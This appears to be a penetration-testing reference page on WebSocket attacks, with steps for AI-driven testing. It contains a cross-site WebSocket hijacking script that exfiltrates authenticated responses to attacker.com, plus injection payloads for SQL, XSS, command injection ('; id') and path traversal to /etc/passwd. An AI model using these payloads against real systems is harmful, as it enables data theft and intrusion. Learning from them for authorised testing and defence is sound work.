---
id: "websocket-attacks"
title: "WebSocket Security Testing"
type: "technique"
category: "web-application"
subcategory: "authorization"
tags: ["websocket", "ws", "wss", "cross-site-websocket", "hijacking", "injection", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["csrf-modern", "xss-techniques", "idor-bola"]
updated: "2026-03-30"
---

## Overview

WebSockets provide full-duplex communication and bypass many traditional web security controls. They don't use SameSite cookies for protection, have no built-in CSRF defense, and often implement custom auth that's weaker than HTTP endpoint auth. Found in chat apps, real-time dashboards, trading platforms, and collaborative tools.

## Cross-Site WebSocket Hijacking (CSWSH)

WebSocket handshake sends cookies automatically — no SameSite protection.

```html
<script>
// From evil.com, connect to victim's authenticated WebSocket
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"get_profile"}');
};
ws.onmessage = function(e) {
    // Exfiltrate authenticated response
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

## Message Injection

```json
// IDOR via WebSocket
{"action":"get_user","user_id":"VICTIM_ID"}

// SQL injection in WebSocket message
{"action":"search","query":"' OR 1=1--"}

// XSS via WebSocket (if messages are rendered in DOM)
{"message":"<img src=x onerror=alert(1)>"}

// Command injection
{"action":"ping","host":"127.0.0.1; id"}

// Path traversal
{"action":"read_file","path":"../../../etc/passwd"}
```

## Auth Testing

```
# Test without cookies (remove Cookie header from upgrade request)
# Test with other users' tokens
# Test after session invalidation (does WS stay connected?)
# Test origin validation (connect from evil.com origin)
# Test if auth is checked per-message or only at handshake
```

## Smuggling via WebSocket

```
# WebSocket connection upgrade can be used to smuggle HTTP requests
# If reverse proxy doesn't properly handle WebSocket upgrades:

GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade

# After upgrade, send raw HTTP to backend
GET /admin HTTP/1.1
Host: target.com
```

## Deep Dig Prompts

```
Given this WebSocket endpoint [describe]:
1. Test Cross-Site WebSocket Hijacking from an attacker-controlled origin.
2. Check origin validation on the handshake request.
3. Test every message type for injection (SQLi, XSS, IDOR, command injection).
4. Verify auth is enforced per-message, not just at connection time.
5. Test if the connection survives session invalidation/password change.
6. Check for message rate limiting and DoS potential.
```

## Tools

- **Burp Suite** — WebSocket message interception and modification
- **OWASP ZAP** — WebSocket testing support
- **websocat** — Command-line WebSocket client
- **wscat** — Node.js WebSocket client
